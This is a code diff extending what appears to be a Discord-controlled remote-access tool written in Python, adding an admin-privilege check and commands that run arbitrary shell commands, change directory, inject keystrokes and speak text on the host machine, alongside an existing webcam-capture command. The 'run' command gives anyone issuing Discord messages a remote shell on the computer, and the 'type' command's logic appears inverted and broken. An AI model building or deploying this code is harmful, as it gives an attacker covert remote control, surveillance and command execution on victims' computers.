@@ -23,6 +23,8 @@ import psutil
 import pyautogui
 import requests
 from discord.ext import commands
+import pyttsx3
+import threading
 
 TOKEN = open("token.txt", "r").read()
 PREFIX = ">"
@@ -193,6 +195,14 @@ def bytes_to_GB(bytes):
     gb = bytes/(1024*1024*1024)
     gb = round(gb, 2)
     return gb
+
+
+def is_admin():
+    if os.name == "nt":
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    else:
+        return os.geteuid() == 0
 
 
 @client.command()
@@ -1173,6 +1183,102 @@ async def webcam(ctx):
         await ctx.send(file=file, embed=embed)
 
         os.remove("temp.png")
+
+    except Exception as e:
+        await ctx.send(str(e))
+
+
+@client.command()
+async def run(ctx, *commands):
+    try:
+        final_commands = ' '.join(commands)
+        code, out, err = run_system_command(final_commands.split(" "))
+        embed = discord.Embed(
+            title=f"Run system commands on {getpass.getuser()}'s Computers",
+            description=f"Return Code: **{code}**\nOutput:\n```{out or err}```",
+            timestamp=datetime.utcnow(),
+            color=0xFF5733
+        )
+        embed.set_footer(
+            text=f'Requested by {ctx.author.name}',
+            icon_url=ctx.author.avatar_url
+        )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        await ctx.send(str(e))
+
+
+@client.command()
+async def cd(ctx, directory):
+    try:
+        os.chdir(directory)
+        code, out, err = run_system_command(["pwd"])
+        embed = discord.Embed(
+            title=f"Change Directory on {getpass.getuser()}'s Computer",
+            description=f"Return Code: **{code}**\nCurrent Working Directory:\n```{out or err}```",
+            timestamp=datetime.utcnow(),
+            color=0xFF5733
+        )
+        embed.set_footer(
+            text=f'Requested by {ctx.author.name}',
+            icon_url=ctx.author.avatar_url
+        )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        await ctx.send(str(e))
+
+
+@client.command()
+async def type(ctx, *words):
+    try:
+        all_text = ' '.join(words)
+
+        if all_text == "enter":
+            pyautogui.typewrite(all_text)
+        else:
+            pyautogui.press("enter")
+
+        embed = discord.Embed(
+            title=f"Type {getpass.getuser()}'s Computer",
+            description=f"Sent these keys:\n ```{all_text}```",
+            timestamp=datetime.utcnow(),
+            color=0xFF5733
+        )
+        embed.set_footer(
+            text=f'Requested by {ctx.author.name}',
+            icon_url=ctx.author.avatar_url
+        )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        await ctx.send(str(e))
+
+
+@client.command()
+async def speak(ctx, *texts):
+    try:
+        def speak_text(text: str):
+            engine = pyttsx3.init()
+            engine.say(text)
+            engine.runAndWait()
+
+        final_text = ' '.join(texts)
+        t1 = threading.Thread(target=speak_text, args=(final_text,))
+        t1.start()
+
+        embed = discord.Embed(
+            title=f"Speaking on {getpass.getuser()}'s Computer",
+            description=f"Speaking\n```{final_text}```",
+            timestamp=datetime.utcnow(),
+            color=0xFF5733
+        )
+        embed.set_footer(
+            text=f'Requested by {ctx.author.name}',
+            icon_url=ctx.author.avatar_url
+        )
+        await ctx.send(embed=embed)
 
     except Exception as e:
         await ctx.send(str(e))
